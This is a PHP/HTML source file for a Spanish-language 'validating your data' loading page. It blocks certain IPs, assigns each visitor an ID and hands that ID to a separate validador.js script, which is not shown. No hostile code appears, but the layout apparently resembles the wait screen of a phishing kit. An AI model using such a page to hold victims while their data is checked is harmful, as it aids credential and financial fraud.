<?php
ob_start();
require_once __DIR__ . '/helpers.php';
checkIPBlocked();

$visitor_id = getVisitorId();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/svg+xml" href="assets/images/avatar_male.svg">
</head>
<body>
    <header class="top-nav-header">
        <div class="header-container">
            <div class="header-left">
                <a href="#" class="header-brand">
                    <div class="brand-logo-box"><img src="assets/images/logo.png" alt="Logo" class="header-logo-img"></div>
                </a>
            </div>
            <div class="header-right">
                <button type="button" class="btn-menu-hamburger" aria-label="Menú principal">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="4" y1="7" x2="20" y2="7"></line>
                        <line x1="4" y1="12" x2="20" y2="12"></line>
                        <line x1="4" y1="17" x2="20" y2="17"></line>
                    </svg>
                </button>
            </div>
        </div>
    </header>
    <div class="viewport-container" id="mainViewport" style="align-items: center; padding-top: 0;">
        <div class="loading-box-wrapper app-step" id="stepLoading" style="display: flex;">
            <div class="circular-spinner" aria-hidden="true"></div>
            <h1 class="loading-title">Estamos validando tus datos</h1>
            <p class="loading-desc">Por favor espera un momento,<br>no cierres esta ventana.</p>
        </div>
    </div>
    
    <!-- Inyección segura de la variable PHP a JS -->
    <script>
        const visitorId = <?php echo json_encode($visitor_id); ?>;
    </script>
    
    <!-- Llamada al nuevo script optimizado -->
    <script src="assets/js/validador.js"></script>
</body>
</html>
